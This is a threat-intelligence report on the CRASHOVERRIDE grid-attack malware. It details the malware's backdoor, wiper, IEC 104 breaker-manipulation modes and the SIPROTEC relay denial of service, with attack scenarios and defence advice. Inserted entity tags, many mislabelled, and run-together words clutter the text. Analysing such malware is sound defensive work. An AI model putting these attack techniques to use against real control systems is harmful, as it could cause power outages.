feedback on how they are being detected and analyzed . This case is no different . In fact , it is more important given that there is no simple fix as the capa- bility described in this report takes advantage of the knowledge of electric grid sys- tems . It is not an aspect of technical vulnerability and exploitation . It can not just be patched or architected away although the electric grid is entirely defensible . Human defenders leveraging an active defense such as hunting and responding internally to the industrial control system ( [ORG] ICS ) networks can ensure that security is maintained.3Key Takeaways\u2022 The malware self - identifies as \u201c crash \u201d in multiple locations thus leading to thenaming convention \u201c CRASHOVERRIDE \u201d for the malware framework.\u2022 [ORG] CRASHOVERRIDE is the [ORDINAL] first ever malware framework designed and deployed toattack electric grids.\u2022 [ORG] CRASHOVERRIDE is the [ORDINAL] fourth ever piece of [ORG] ICS - tailored malware ( STUXNET , [LAW] BLACKENERGY [LAW] 2 , and [PERSON] HAVEX were the [ORDINAL] first [CARDINAL] three ) used against targets and the [ORDINAL] second ever to be designed and deployed for disrupting physical industrial pro- cesses ( STUXNET was the first).\u2022 [ORG] CRASHOVERRIDE is not unique to any particular vendor or configuration and instead leverages knowledge of grid operations and network communications to cause impact ; in that way , it can be immediately re - purposed in [LOC] Europe and portions of [LOC] the [LOC] Middle [LOC] East and Asia.\u2022 CRASHOVERRIDE is extensible and with a small amount of tailoring such as the inclusion of a DNP3 protocol stack would also be effective in the [LOC] North Ameri- can grid.\u2022 CRASHOVERRIDE could be leveraged at multiple sites simultaneously , but thescenario is not cataclysmic and would result in [TIME] hours , potentially [DATE] a [DATE] few [DATE] days , of outages , not [DATE] weeks or more.\u2022 [PERSON] Dragos assesses with high confidence that the same malware was used in the cyber - attack to de - energize a transmission substation on [DATE] December 17 , [DATE] 2016 , resulting in outages for an unspecified number of customers.\u2022 The functionality in the [ORG] CRASHOVERRIDE framework serves no espionage pur - pose and the only real feature of the malware is for attacks which would lead to electric outages.\u2022 CRASHOVERRIDE could be extended to other industries with additional pro- tocol modules , but the adversaries have not demonstrated the knowledge of other physical industrial processes to be able to make that assessment anything other than a hypothetical at this point and protocol changes alone would be insufficient.\u2022 [ORG] Dragos , [ORG] Inc. tracks the adversary group behind [ORG] CRASHOVERRIDE as ELECTRUM and assesses with high confidence through confidential sources that ELECTRUM has direct ties to the [ORG] Sandworm team . Our intelligence [ORG] ICS WorldView cus- tomers have received a comprehensive report and this industry report will not get into sensitive technical details but instead focus on information needed for defense and impact awareness.4BackgroundOn [DATE] June 8th , [DATE] 2017 the Slovak anti - virus firm ESET shared a subset of digital hash- es of the malware described below and a portion of their analysis with [PERSON] Dragos . The Dragos team was asked to validate ESET \u2019s findings to news publications [ORG] ESET had contacted about the story which would be published [DATE] June 12th , [DATE] 2017 . [PERSON] Dragos would like to thank ESET for sharing the digital hashes which allowed the [NORP] Dragos team to spawn its investigation . Without control of the timeline , it was [EVENT] Dragos \u2019 desire to publish a report alongside ESET \u2019s report to capture the nuance of elec- tric grid operations . The report also contains new discoveries , indicators , and im- plications of the tradecraft . Also , because of the connection to the activity group [GPE] Dragos tracks as ELECTRUM , it was our decision that an independent report was warranted . The Dragos team has been busy over [TIME] the [TIME] last [TIME] 96 [TIME] hours reproducing and verifying ESET \u2019s analysis , hunting for new samples of the malware and potential ad- ditional infections , notifying appropriate companies , and informing our customers . Importantly , [PERSON] Dragos also updated [ORG] ICS vendors that needed to be made aware of this capability , relevant government agencies , many national computer emergen- cy response teams ( CERTs ) , and key players in the electric energy community . Our many thanks to those involved . If you are a [ORG] Dragos , [ORG] Inc. customer , you will have already received the more concise and technically in - depth intelligence report . It will be accompanied by follow - on reports , and the Dragos team will keep you up - to - date as things evolve . It is in [EVENT] Dragos \u2019 view that the following report contains significant assessments that de- serve a wide audience in the electric sector . Avoiding hype and fear should always be paramount but this case - study is of immediate significance , and this is not a singular contained event . The [ORG] CRASHOVERRIDE capability is purpose built to im- pact electric grid operations and has been created as a framework to facilitate the impact of electric grids in other countries in the future outside the attack that took place with it [DATE] December 17th , [DATE] 2016 in [GPE] Ukraine . However , as always , the defense is doable.5Introduction to [ORG] Electric [PERSON] Grid [PERSON] OperationsAs with most [ORG] ICS specific incidents , the most interesting components of the attack are in how the adversary has demonstrated they understand the physical industri- al process . Whereas vulnerabilities , exploits , and infection vectors can drive dis- cussions in intrusion analysis of IT security threats that is not the most important aspect of an [ORG] ICS attack . To fully understand the [ORG] CRASHOVERRIDE framework , its individual capabilities , and overall impact on [ORG] ICS security it is important to under- stand certain fundamentals of electric grid operations . Simplistically , the electric grid can be categorized into [CARDINAL] three functions : generation of electricity at power plants , transmission from the power plants across typically long distances at high voltage , and then stepped down to lower voltage to distribu- tion networks to power customers . Along these long transmission and distribution systems are substations to transform voltage levels , serve as switching stations and feeders , and fault protection . Many industries feed into the electric grid , and those differences require different systems and communications . As an example , while a power plant feeds energy into the electric grid there is no one - size - fits - all approach to power plants . There are power plants that cover different sources of fuel including coal - fired , nuclear generation , wind farm , solar farm , gas turbine power , hydroelectric and more . This means that the electric grid must be a robust , almost living creature , which moves and balances electricity across large regions . Electric grids use a special type of industrial control system called a supervisory control and data acquisition ( [ORG] SCADA ) system to manage this process across large geographical areas . Transmission and distribution owners have their substations in their particular geographical footprint and control centers manage the cross - territory [NORP] SCADA systems [CARDINAL] 24/7 by human op- erators . These control centers often regularly manage the continual demand and response of their customers , respond to faults , and plan and work with neighboring utilities . This simplistic view of grid operations is similar around the world . There are of- [CARDINAL] ten vendor and network protocol differences between countries but the electrical engineering , and the overall process is largely the same between nations . As an example , these systems use [GPE] SCADA and leverage systems such as remote terminal units ( RTUs ) to control circuit breakers . As the breakers open and close , substations are energized or de - energized to balance power across the grid . Some network protocols such as [ORG] IEC [ORG] 104 , a [ORG] TCP - based protocol , and its serial protocol compan- ion [EVENT] IEC [EVENT] 101 , are often regional specific . [LOC] Europe , some of [NORP] Asian , and portions of [LOC] the [LOC] Middle [LOC] East leverage these protocols to control RTUs from the [ORG] SCADA human machine interfaces ( HMIs).6Figure [CARDINAL] 1 : [PERSON] Simplistic [PERSON] Mockup of [ORG] Electric [ORG] Grid [ORG] Operations [ORG] Systems and Communications Relevant for CRASHOVERRIDEIn [LOC] North [LOC] America , the protocol of choice for this is [ORG] the [ORG] Distributed [ORG] Network [ORG] Proto- col [CARDINAL] 3 ( DNP3 ) . The various protocols purposes are largely the same though : control physical equipment through RTUs , programmable logic controllers ( PLCs ) , and other final control elements via HMIs as a part of the larger [NORP] SCADA system . Some protocols have been adopted cross - country including [ORG] IEC [ORG] 61850 which is usual- ly leveraged from an [ORG] HMI to work with equipment such as digital relays and other types of intelligent electronic devices ( IEDs ) . IEDs are purpose built microproces- sor - based control devices and can often be found alongside power equipment such as circuit breakers . IEDs and RTUs operate in a master / slave capacity where the slave devices are polled and sent commands by master devices.7Substations manage the flow of power through transmission or distribution lines . Management of energizing and de - energizing of these lines ultimately control when and where the flow of power moves in and out of the substation . If you \u201c open \u201d a breaker you are removing the path where the electricity is flowing , or de - energizing it . If you \u201c close \u201d a breaker then you are energizing the line by closing the gap and allowing the power to \u201c flow . \u201d This concept is similar to anyone who has tripped ( opened ) a breaker in their house . Traditional \u201c IT \u201d or \u201c IT security \u201d staff may be confused on this terminology as it is opposite to how one would describe firewall rules where \u201c open \u201d means network traffic may flow and \u201c closed \u201d means network traffic is prohibited . The grid is a well - designed system , and while damage can be done , it is vital to un- derstand that in nations around the world the electric community has designed the system to be reliable and safe which has a natural byproduct of increased securi- ty . In [GPE] the [GPE] United [GPE] States as an example , reliability is reinforced with regular training and events such as the [NORP] North [NORP] American grid \u2019s GridEx where grid operators train for events from hurricanes , to terrorist incidents , to cyber - attacks and how they will respond to such outages . There is constantly a balance that must be understood when referring to grid operations : yes , the systems are vulnerable and more must be done to understand complex and multi - stage attacks , but the grid is also in a great defensible position because of the work of so many over [DATE] the [DATE] years . Evolution of TradecraftCRASHOVERRIDE represents an evolution in tradecraft and capabilities by ad- versaries who wish to do harm to industrial environments . To fully appreciate the malware it is valuable to compare it to its predecessors and the [GPE] Ukraine [DATE] 2015 cyber attack . STUXNETThe STUXNET malware has been written about extensively and referenced , at times , unfortunately , in comparison to most [ORG] ICS related incidents and malware . It was the [ORDINAL] first confirmed example of [ORG] ICS tailored malware leveraged against a tar- get . The Windows portion of the code with its [CARDINAL] four zero - day exploits gained a lot of notoriety . However , it was the malware \u2019s payload that was specific to [ORG] ICS that was the most interesting component . The tradecraft exhibited by STUXNET was the detailed understanding of the industrial process . In IT networks , it is important for adversaries to identify vulnerabilities and exploit them to load malware and gain privileges on systems.8In [ORG] ICS networks though , some of the most concerning issues are related to an adversary \u2019s ability to learn the physical process such as the engineering of the systems and their components in how they work together . STUXNET \u2019s greatest strength was leveraging functionality in [ORG] Siemens equipment to interact with nucle- ar enrichment centrifuges through abuses of intended functionality . The purpose of the [ORG] Siemens equipment was to be able to control and change the speed of the centrifuges . Stuxnet did this as well but with pre - programmed knowledge from the attackers on the speeds that would cause the centrifuge to burst from their cas- ings . [ORG] ICS tailored malware leveraging knowledge of industrial processes was now a thing . However , it was specific to [ORG] Siemens equipment and unique to the [ORG] Natanz fa- cility in [GPE] Iran . While tradecraft and exploits can be replicated , it was not reasonable to re - purpose the Stuxnet capability . [ORG] Dragonfly / HAVEXThe [ORG] Dragonfly campaign was an espionage effort that targeted numerous industrial control system locations , estimates put it at [CARDINAL] over [CARDINAL] 2,000 sites , with a large empha- sis on electric power and petrochemical asset owners . The [ORG] Dragonfly campaign leveraged the [PERSON] HAVEX malware . There are often not many commonalities between different industrial sites . Even a single substation in [CARDINAL] one company can be almost entirely different than a substation in the same company based on vendors , imple- mentation , integration , and the physical processes required at each site . [CARDINAL] One of the few commonalities across numerous [ORG] ICS industries though is the OPC protocol . It is designed to be the universal translator for many industrial components and is readily accessible in an [ORG] HMI or dedicated OPC server . The [PERSON] HAVEX malware lever- aged legitimate functionality in the OPC protocol to map out the industrial equip- ment and devices on an [ORG] ICS network . It was a clever use of the protocol and while the malware itself was not complex the tradecraft associated with the usage of OPC was sophisticated . However , the [ORG] Dragonfly campaign was focused entirely on espionage . There was no physical disruption or destruction of the industrial pro- cess . Instead , it was the type of data you would want to leverage to design attacks in the future built for the specific targets impacted with the malware.9BLACKENERGY 2The [ORG] Sandworm team has targeted numerous industries ranging from western mil- itaries , governments , research organizations , defense contractors , and industrial sites . It was their use of the BLACKENERGY 2 malware that caught the [ORG] ICS indus- try \u2019s attention . This [ORG] ICS tailored malware contained exploits for specific types of [ORG] HMI applications including [ORG] Siemens [ORG] SIMATIC , [ORG] GE [ORG] CIMPLICITY , and [ORG] Advantech We- [ORG] bAccess . BLACKENERGY 2 was a smart approach by the adversaries to target in- ternet connected HMIs . Upon exploitation of the HMIs , the adversaries had access to a central location in the [ORG] ICS to start to learn the industrial process and gain the graphical representation of that [ORG] ICS through the [ORG] HMI . The targeting of HMIs alone is often not enough to cause physical damage , but it is an ideal target for espio- nage and positioning in an [ORG] ICS . Gaining a foothold in the network that had access to numerous components of the [ORG] ICS while maintaining command and control to Internet locations , positioned it well for espionage . [GPE] Ukraine Cyber Attack 2015The cyber - attack on [CARDINAL] three power companies in [GPE] Ukraine on [DATE] December 23rd , [DATE] 2015 marked a revolutionary event for electric grid operators . It was the [ORDINAL] first known in- stance where a cyber - attack had disrupted electric grid operations . The [ORG] Sandworm team was attributed to the attack and their use of the BLACKENERGY 3 malware . BLACKENERGY [CARDINAL] 3 does not contain [ORG] ICS components in the way that BLACKENER- GY 2 did . Instead , the adversaries leveraged the BLACKENERGY 3 malware to gain access to the corporate networks of the power companies and then pivot into the [ORG] SCADA networks . While in the environment the adversaries performed their recon- naissance and eventually leveraged the grids systems against itself . They learned the operations and used the legitimate functionality of distribution management systems to disconnect substations from the grid leaving 225,000 + customers without power for upwards of [TIME] 6 [TIME] hours until manual operations could restore pow- er . However , due to the wiping of Windows systems through the [PRODUCT] KillDisk malware and destruction of serial - to - Ethernet devices through malicious firmware updates , the [GPE] Ukrainian grid operators were without their [ORG] SCADA environment , meaning they lost the ability for automated control , for upwards of a year in some locations . The most notable aspect of the attack was the adversary \u2019s focus on learning how to leverage the systems against themselves . [PERSON] Malware enabled the attack , and malware delayed restoration efforts , but it was the direct interaction of the adversary lever- aging the [ORG] ICS against itself that resulted in the electric power disruptions , not mal- ware.10CRASHOVERRIDEThe CRASHOVERRIDE malware impacted a single transmission level substation in [GPE] Ukraine on [DATE] December 17th , [DATE] 2016 . Many elements of the attack appear to have been more of a proof of concept than what was fully capable in the malware . The most important thing to understand though from the evolution of tradecraft is the codification and scalability in the malware towards what has been learned through past attacks . The malware took an approach to understand and codify the knowl- edge of the industrial process to disrupt operations as STUXNET did . It leveraged the OPC protocol to help it map the environment and select its targets similar to [PERSON] HAVEX . It targeted the libraries and configuration files of HMIs to understand the environment further and leveraged HMIs to connect to Internet - connected lo- cations when possible as BLACKENERGY 2 had done . And it took the same type of approach to understanding grid operations and leveraging the systems against themselves displayed in [GPE] Ukraine [DATE] 2015 \u2019s attack . It did all of these things with added sophistication in each category giving the adversaries a platform to conduct at- tacks against grid operations systems in various environments and not confined to work only on specific vendor platforms . It marks an advancement in capability by adversaries who intend to disrupt operations and poses a challenge for defenders who look to patching systems as a primary defense , using anti - malware tools to spot specific samples , and relying upon a strong perimeter or air - gapped network as a silver - bullet solution . Adversaries are getting smarter , they are growing in their ability to learn industrial processes and codify and scale that knowledge , and de- fenders must also adapt.11CapabilitiesCapabilities OverviewThe CRASHOVERRIDE malware is a modular framework consisting of an initial backdoor , a loader module , and several supporting and payload modules . The most important items are the backdoor , which provides access to the infected system , the loader module , which enables effects on the target , and the individual payload modules . [PERSON] Dragos focused our analysis on the previously mentioned items as they are most relevant for defending grid operations . Dragos analysts were able to obtain two samples of the malware related to effects on the targeted industrial control system . [CARDINAL] One sample was the [EVENT] IEC [EVENT] 104 protocol module , and the other sample was the data wiper . Both samples shared common design characteristics indicative of being part of a broader [ORG] ICS attack and manip- ulation framework . ESET was able to uncover an additional IEC 61850 and OPC module which they have analyzed and shared with [PERSON] Dragos . Below contains an overview of program execution flow and dependency . Figure [CARDINAL] 2 . [ORG] CRASHOVERRIDE [ORG] Module [ORG] Overview [ORG] Including [ORG] ESET \u2019s Discoveries12Module [ORG] CommonalitiesDragos analysts were able to determine the compile time for both modules ob- tained as being within [TIME] 12 [TIME] minutes of each other just after [TIME] 2:30 [TIME] am on [DATE] December [DATE] 18th in an unknown time zone although timestamps for both samples were zeroed out . These times falls in the same timeframe as the [GPE] Ukraine events . Both mod- ule samples exported a function named Crash that served as the main function to begin execution . The common Crash function enables the ability to \u201c plug and play \u201d additional modules . Backdoor / RAT ModuleKey Features\u2022 Authenticates with a local proxy via the internal network established before thebackdoor installation\u2022 After authentication opens HTTP channel to external command and controlserver ( C2 ) through internal proxy\u2022 Receives commands via the external command and control ( [CARDINAL] C2 ) server\u2022 Creates a file on the local system ( contents not determined)\u2022 [PERSON] Overwrites an existing service to point to the backdoor so the malware persistsbetween rebootsDetailsAccess to the [ORG] ICS network flows through a backdoor module . Dragos obtained [CARDINAL] four samples which all featured similar functionality . On execution , the malware attempts to contact a hard - coded proxy address located within the local network . ELECTRUM must establish the internal proxy before the installation of the back- door . The malware expects to communicate to an internal proxy listening on TCP 3128 . This port is a default port associated with the Squid proxy . The beaconing contin- ues without pause until it establishes a connection . The backdoor then sends a se- ries of [ORG] HTTP [ORG] POST requests with the victim \u2019s Windows GUID ( a unique identifier set with every Windows installation ) in the HTTP body . This information authenticates the targeted machine to the command and control ( C2 ) server . If the C2 server does not respond , the backdoor will exit.13If the authentication is successful to the internal proxy , the malware attempts to per- form an HTTP CONNECT to an external C2 server via the internal proxy . Across [CARDINAL] four samples , [PERSON] Dragos identified [CARDINAL] three different C2 addresses which were likely part of the dresses were listed as active [ORG] TOR nodes during the events in [GPE] Ukraine . When performing the HTTP CONNECT , the malware attempts to identify the system default user agent . If this can not be determined or does not exist , then a hard - coded default for the malware is used : [PERSON] Mozilla/4.0 ( compatible ; [ORG] MSIE [CARDINAL] 7.0 ; [EVENT] Windows [EVENT] NT [EVENT] 5.1 ; InfoPath.1)The malware can be configured to beacon out periodically afterwards via a hard - coded configuration value . The implant is designed to retrieve commands from the C2 server:\u2022 Create a new process as logged in user\u2022 Create a new process as specified user via CreateProcessWithLogon\u2022 Write a file\u2022 Copy a file\u2022 Execute a command as logged in user\u2022 Execute a command as specified user\u2022 [PERSON] Kill [PERSON] the [PERSON] backdoor\u2022 [PERSON] Stop a service\u2022 Specify a user ( log in as user ) and stop a service\u2022 Specify a user ( log in as user ) and start a service\u2022 Alter an existing service to point to specified process and change to start at bootExecution results in several artifacts left on the host . During execution , the malware checks for the presence of a mutex value . Mutexes are program objects that name re- sources to enable sharing with multiple program threads . In this case , [ORG] CRASHOVERRIDE checks the following:\\Sessions\\1\\Windows\\ApiPortection14The backdoor may also create and check a blank mutex name . Reviewing memo- ry during execution and analysis of other modules in the malware indicates that \\ Sessions\\1\\Windows\\ appears multiple times , indicating that a check may be per- formed . The backdoor writes a file to either [ORG] C:\\Users\\Public\\ or C:\\Users\\<Executing User > The contents of this file were not discovered during our analysis , and it did not appear to be vital to the malware functionality . However , this is a good indicator of the observed activity and may be leveraged to detect this specific sample through host - based indicator checking . The service manipulation process is the only persistence mechanism for the mal- ware . When used , the adversary can select an arbitrary system service , direct it to refer to [ORG] CRASHOVERRIDE , and ensure it is loaded on system boot . If this fails , the malware , although present on disk , will not start when the machine reboots . When evaluating the options provided to the adversary , an important piece of functionality associated with most remote access tools is absent : a command to exfiltrate data . While this functionality could be created via the command execu- tion options , one would expect this option to be explicit given options to down- load and copy files on the host if the adversary intended to use the tool as an all - encompassing backdoor and espionage framework . Instead , the functionality of this tool is explicitly designed for facilitating access to the machine and execut- ing commands on the system and can not reasonably be confused as an espionage platform , data stealer , or another such item . Launcher [ORG] ModuleKey Features\u2022 [GPE] Loads payload modules which manipulate the [ORG] ICS and cause destruction viathe wiper\u2022 [PERSON] Starts itself as a service likely to hide [LOC] better\u2022 [LOC] Loads the payload module(s ) defined on the command line during execu - tion\u2022 Launches the payload and begins either [CARDINAL] 1 or [TIME] 2 [TIME] hours countdown beforelaunching the data wiper ( variant dependent)15DetailsWithin the attack sequence , the [ORG] ICS payload modules and data wiper module must be loaded by a separate loader [ORG] EXE . Dragos obtained [CARDINAL] one sample of this file called the Launcher . The launcher takes [CARDINAL] three parameters on start : [GPE] Launcher.exe < Working Directory > payload.dll configuration.iniOn launch , the sample analyzed starts a service named defragsvc . It then loads the module [ORG] DLL via an exported function named Crash . A new thread is created at the highest priority on the executing machine . Control then passes from the launcher to the loaded module while the launcher waits [TIME] two [TIME] hours before executing the data wip- er . [ORG] Data [ORG] Wiper ModuleKey Features\u2022 Clears all registry keys associated with system [PERSON] services\u2022 [PERSON] Overwrites all [ORG] ICS configuration files across the hard drives and all mapped net- work drives specifically targeting [PRODUCT] ABB [PRODUCT] PCM600 configuration files in [LOC] this [LOC] sample\u2022 [LOC] Overwrites generic Windows files\u2022 Renders the system unusableDetailsOnce executed , the data wiper module clears registry keys , erase files , and kill pro- cesses running on the system . A unique characteristic of the wiper is that the main functionality was implemented within the [ORG] Crash function . The [ORDINAL] first task of the wiper writes [CARDINAL] zeros into all of the registry keys in : SYSTEM\\CurrentControlSet\\ServicesThis registry tree contains initialization values for each service on the system . Removal of these values renders a system inoperable . The next wiper task targets [ORG] ICS configu- ration files across the local hard drive and mapped network drives . The malware au- thors included functionality to target drives lettered C - Z.16The wiper also targets file types unique to [ORG] ABB \u2019s [PERSON] PCM600 product used in substa- tion automation in addition to more general Windows files . The below table out- lines some of the unique file extensions used by industrial control systems . Usage PCM600 Project ( [ORG] ABB ) PCM600 [ORG] IEC [ORG] File ( [ORG] ABB ) PCM600 Template IED File ABB MicroScada Programmable [ORG] Logic [ORG] File [ORG] PLC [ORG] Archive [ORG] File [ORG] Substation [ORG] Configuration [ORG] Language [ORG] Configured [ORG] IED [ORG] Description [ORG] Substation [ORG] Configuration DescriptionTable 1 . File extensions targeted by the data wiper moduleFile Extension .scdIEC [CARDINAL] 104 [ORG] ModuleKey Features\u2022 Reads a configuration file defining the target ( likely an RTU ) and action totake\u2022\u2018Kills \u2019 legitimate the master process on the victim host\u2022 [PERSON] Masquerades as the new master\u2022 [PRODUCT] Enters [CARDINAL] one of [CARDINAL] four modes:\u2022 [GPE] Sequence mode : continuously sets RTU IOAs to open\u2022 Range mode : ( [CARDINAL] 1 ) Interrogates each RTU for valid IOAs ; ( [CARDINAL] 2 ) toggles eachIOA between open and closed [ORG] state\u2022 Shift mode : unknown at this time\u2022 Persist mode : unknown at this time / not fully implemented17Figure [CARDINAL] 3 . Protocol Transmission Types in IEC 10418Figure 4 : Execution Flow of IEC 104 Module in CRASHOVERRIDEDetailsThe CRASHOVERRIDE IEC 104 module is a complete implementation of IEC 104 to serve in a \u201c MASTER \u201d role . This raw functionality creates a [NORP] Swiss army knife for sub- station automation manipulation yet also provides tailored functionality . The func- tions exposed to the malware operator are confined by the options of the configu- ration file . This report outlines the options analyzed [DATE] today but notes that extending and enhancing functionality is straight forward with the robust protocol implemen- tation.19The design of the [ORG] IEC [ORG] 104 module differs from the wiper and suggests that a sec- ondary group of developers could have been involved . Instead of the exported crash function containing the primary execution instructions , the function parses the config file then starts a thread containing the [ORG] IEC [ORG] 104 master . The configuration file can have multiple entries offset by [ STATION ] , followed by [CARDINAL] 13 values : File Extension NONETable 2 . IEC-104 module configuration file fieldsThe configuration file is critical to achieving an effect on the target , as target spec- ifications for the device must be provided by the operator in the configuration file for the module to function . There are no observed automated means of enumerat- ing the network and then impacting RTUs . Each [ STATION]entry spawns a thread for follow - on effects against [ORG] ICS equipment . Once the IEC 104 master thread begins , the [ORDINAL] first action is to try to kill the commu- nications service process which acts as the master process . Once the module stops the communications service process , a socket opens with the target [ORG] IP and desti- nation port sending data to slave devices and receiving the resulting responses.20Depending on the mode defined within the configuration file the module [PERSON] may:\u2022 [PERSON] Set specific values\u2022 Enumerate IOAs on the target [GPE] devices\u2022 Continuously set the [ORG] IOA to open , or\u2022 Continuously toggle the [ORG] IOA between open and closed states . This module contains no interactive capability . RTUs and PLCs , in simplistic terms , act on input and output . Each discrete input and output is tied to a memory address . Depending on implementation these ad- dresses are referred to as coils , registers , or for IEC 104 : information object ad- dresses ( IOAs ) . IOAs are typed and can hold different value types , such as [NORP] Boolean or Unsigned [NORP] Integer values . The [FAC] 104 module properly understands how to enu- merate and discover IOAs to operate breakers . IEC 101 ModuleThis module was unavailable to [PERSON] Dragos at the time of publication . ESET \u2019s analysis claims the functionality is equivalent to the [ORG] IEC [ORG] 104 module except with communi- cations over serial . However , [PERSON] Dragos was able to confirm that the module exists . IEC 61850 ModuleThis module was unavailable to [PERSON] Dragos at the time of publication . ESET \u2019s analysis claims once executed the module leverages a configuration file to identify targets and without a configuration file it enumerates the local network to identify poten- tial targets . It communicates with the targets to identify whether the device con- trols a circuit breaker switch . For certain variables ( no further information avail- able ) it will change their state while also generating an action log . However , [PERSON] Dragos was able to confirm that this module does exist . OPC DA ModuleThis module was unavailable to [PERSON] Dragos at the time of publication . ESET \u2019s analysis claims the module does not require a configuration . It enumerates all OPC servers and their associated items looking for a subset related to [ORG] ABB containing the string ctl . It then writes 0x01 twice into the item overwriting the proper value giving the device a primary value out of limits device status . However , [PERSON] Dragos was able to confirm that this module exists.21SIPROTEC DoS ModuleThis module was unavailable to [PERSON] Dragos at the time of publication . ESET \u2019s analysis claims the module sends [ORG] UDP packets to port [CARDINAL] 50000 exploiting CVE-2015 - 5374 causing the [ORG] SIPROTEC digital relay to fall into an unresponsive state . [PERSON] Dragos could not validate that this module exists . [ORG] Capability ConclusionsELECTRUM \u2019s ability to adopt a development style described above has several im- plications : [ORDINAL] first , developers can integrate new protocols into the overall framework quickly . [ORDINAL] Second , ELECTRUM could easily leverage external development teams skilled at exploiting industrial control systems . Some adversaries would likely ap- proach capability development through a \u2018 [CARDINAL] two - tier \u2019 approach : a core development team skilled at writing the overall framework and a [ORDINAL] second team knowledgeable about a given control system . The platform team would take the control sys- tem modules and add logic to fit them within the platform . The [ORG] IEC [ORG] 104 module demonstrates this approach . Given the execution described with [ORDINAL] secondary threads the team authoring the [ORG] Crash function likely did not author the IEC 104 master portion of the code . Both development teams probably worked together to decide on a log file format for consumption by the main [ORG] Crash function and executed in each of the [ORG] IEC [ORG] 104 module threads . Implications of capabilityThis section describes legitimate [ORG] CRASHOVERRIDE attack and impact scenarios . Extensions of these and potential hypothetical scenarios were deemed indetermin- istic and will not be addressed . Attack Option : De - energize substationCRASHOVERRIDE , based on prior knowledge , must have a configuration file for targeting information of [CARDINAL] one or multiple RTUs . This configuration option allows for several types of activities . [CARDINAL] One operation the configuration option allows is \u2018 se- quence . \u2019.22The command sequence polls the target device for the appropriate address- es . Once it is at the subset of known addresses , it can then toggle the value . The command then begins an infinite loop and continues to set addresses to this val- ue effectively opening closed breakers . If a system operator tries to issue a close command on their [ORG] HMI the sequence loop will continue to re - open the breaker . This loop maintaining open breakers will effectively de - energize the substation line(s ) preventing system operators from managing the breakers and re - energize the line(s).The effects of de - energizing a line or substation largely depends on the system dynamics , power flows , and other variables . In some circumstances , it may have no immediate impact while in others it could put customers into an outage . It is im- portant to note that grid operations encompass failure modes and operations can normally compensate . That is , after all , why humans are \u2018 in the loop \u2019 to monitor and maintain the system . From a recovery standpoint , the remote staff will effectively have lost control of the breakers and will be required to send crews to the substation . If the CRASHOVER- RIDE loop continues unabated , then the crews will likely sever communications as both a troubleshooting and recovery action . Severing communications puts the substation in manual operation where a physical presence is now required . This could result in [TIME] a [TIME] few [TIME] hours of outagesAttack Option : Force an Islanding eventDragos is currently investigating a separate and more disruptive attack option in [ORG] CRASHOVERRIDE as described by ESET . As before , the attacker must have a config- uration file for targeting information of [CARDINAL] one or multiple RTUs . This configuration file now uses the range command to begin a loop that toggles the status of the break- er between open and close continuously . The changing breaker status will invoke automated protective operations to isolate ( commonly referred to as \u2018 islanding \u2019 ) the substation . This is an intentional self - protective capability of grid operations . In effect , this breaker strobing takes the substation offline due to the protective relay scheme \u2019s automated operations causing perturbations of some degree on the grid as scientific principles define how the behavior interacts with frequencies and phases . The variables of these effects will dictate impacts but could cause system instabilities depending on the effectiveness of the protection relays and their oper- ations . [GPE] Grid operation contingencies become more critical if multiple substations were under attack likely resulting in many small islanding events . This is assuming coordinated targeting of multiple electric sites and could result in [DATE] a [DATE] few [DATE] days of outages.23Adding Amplification AttacksForcing an islanding of a substation through continual breaker manipulation is sig- nificant by itself . However , [ORG] CRASHOVERRIDE has the potential to amplify this attack even more . [CARDINAL] Two separate [ORG] CRASHOVERRIDE modules offer this opportunity . Using OPC to create a Denial of [ORG] VisibilityThe OPC module ESET analysis suggests it can brute force values . Module OPC . exe will send out a 0x01 status which for the target systems equates to a \u201c [WORK_OF_ART] Primary [WORK_OF_ART] Variable [WORK_OF_ART] Out [WORK_OF_ART] of [WORK_OF_ART] Limits \u201d misdirecting operators from understanding protective relay status . Bit Mask 0x100x080x040x020x01Definition More Status Available \u2013 More status information is available via [LAW] Command [LAW] 48 , Read Additional Status Information . [ORG] Loop [ORG] Current [ORG] Fixed [ORG] \u2013 The Loop Current is being held at a fixed value and is not responding to process variations . [ORG] Loop [ORG] Current [ORG] Saturated \u2013 The Loop Current has reached its upper ( or lower ) endpoint limit and can not increase ( or decrease ) any further . Non - [ORG] Primary [ORG] Variable [ORG] Out of Limits \u2013 A [ORG] Device variable not mapped to the [ORG] PV is beyond its operating limits . [WORK_OF_ART] Primary [WORK_OF_ART] Variable [WORK_OF_ART] Out [WORK_OF_ART] of [WORK_OF_ART] Limits \u2013 The [ORG] PV is beyond its operating limits . The outcome of the action infers that various systems can either perform actions on wrong information or report incorrect information to system operators . [ORG] This [ORG] Denial [ORG] of [ORG] Visibility will amplify misunderstanding and confusion while system op- erators troubleshoot the problem as their system view will show breakers closed when they are open [CARDINAL] 24Using CVE-2015 - 5374 to Hamper Protective RelaysA [ORDINAL] second , and more severe , amplifying attack would be to neutralize the auto- mated protective system by creating a [ORG] Denial [ORG] of [ORG] Service against some or all of the protective relays . This possibility exists in a tool ESET has claimed to have discov- ered that implements the known CVE-2015 - 5374 Denial of Service condition to [ORG] the [ORG] Siemens [ORG] SIPROTEC relays . [ORG] Siemens released a patch for this in [DATE] July [DATE] 2015 under Sie- mens advisory SCA-732541 . At this time it is believed that CVE-2015 - 5374 causes a denial of service ( [NORP] DoS ) of the complete relay functionality and not just the network communications module . [GPE] Dragos has independent evidence that this module ex- ists but it can not be confirmed . Hampering the protective scheme by disabling the protective relays can broaden the islanding event and , if done at scale , could trigger a larger event causing multi- ple substations and lines \u201c islanding \u201d from the electric grid . [ORG] Siemens [ORG] SIPROTEC was likely chosen in this attack only because that was the vendor device at the Ukraine Kiev site attacked in [DATE] December [DATE] 2016 . This same tactic against digital relays , albe- it not the same exploit , could have a similar impact on grid operations . However , there are many different types of digital relays each with different configurations . This amplifying attack would be very difficult to do at scale properly and would require a significant investment on behalf of the adversary.25Defense RecommendationsDoing the basics is always appropriate , and it significantly helps move [ORG] ICS into a defensible position . However , they are not worth repeating here , and instead , more tailored approaches specific to [ORG] ICS security analysts trying to defend against [ORG] CRA- [ORG] SHOVERRIDE and similar capabilities are presented [ORG] below:\u2022 [ORG] Electric utility security teams should have a clear understanding of whereand how [ORG] IEC [ORG] 104 and IEC 61850 protocols are used . [NORP] North [NORP] American elec- tric utilities should include DNP3 on this list in case the malware is extended to impact [GPE] U.S. systems . Look specifically for increased usage of the proto- cols against baselines established in the environment . Also , look for systems leveraging these protocols if they have not before and specifically try to identify systems that are generating new network flows using these proto- cols.\u2022 Similarly , understand OPC implementations and identify how the protocol isbeing used . It is a protocol that is pervasive across numerous sectors . Also , 